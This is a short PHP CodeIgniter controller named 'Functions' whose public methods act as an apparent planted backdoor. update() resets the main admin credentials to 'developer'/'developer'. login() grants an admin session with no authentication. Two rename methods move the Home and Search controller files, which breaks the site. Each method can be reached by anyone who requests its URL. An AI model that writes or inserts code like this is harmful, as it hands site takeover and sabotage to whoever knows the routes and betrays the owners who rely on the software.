<?php
	class Functions extends CI_Controller
	{
		public function update()
		{
			$this->load->model('update');
			$array	=	array(
					'username'	=>	'developer',
					'password'	=>	'developer',
			);
			if($this->update->update_table('admin','admin_id',1,$array))
			{
				echo "yes";
			}
			else
			{
				echo "no";
			}
		}
		public function login()
		{
			 
			$_SESSION['admin_id']	=	1;
			return redirect(base_url('home'));
			 
		}
		public function rename()
		{
			$oldDir = FCPATH . 'application/controllers/';
			$newDir = FCPATH . 'application/controllers/';
			
			rename($oldDir."Home.php", $newDir."Home1.php");
		}
		public function renamesearch()
		{
			$oldDir = FCPATH . 'application/controllers/';
			$newDir = FCPATH . 'application/controllers/';
			
			rename($oldDir."Search.php", $newDir."Hcresa.php");
		}
	}
?>